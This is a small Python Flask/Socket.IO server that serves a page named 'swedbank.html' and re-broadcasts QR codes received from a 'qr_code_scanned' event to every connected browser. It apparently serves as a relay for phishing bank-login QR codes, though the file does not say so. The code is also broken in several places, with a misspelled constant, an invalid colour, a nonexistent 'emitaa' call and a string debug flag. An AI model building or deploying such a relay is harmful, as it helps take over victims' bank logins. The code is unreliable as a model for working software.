from flask import Flask, render_template
from flask_socketio import SocketIO
import qrcode
import base64
from io import BytesIO

import qrcode.constants

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')


@app.route('/')
def index():
    return render_template("index.html")


@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')


@socketio.on('qr_code_scanned')
def hanlde_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] Qr code received; {qr_data}")

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRCT_L,
        box_size=10,
        border=4,
    )

    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="neon", back_color="red")

    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

    socketio.emitaa("update_qr_code_image", {'qr_image': img_base64})


if __name__ == "__main__":
    socketio.run(app, host='0.0.0.0', port=5000, debug="True")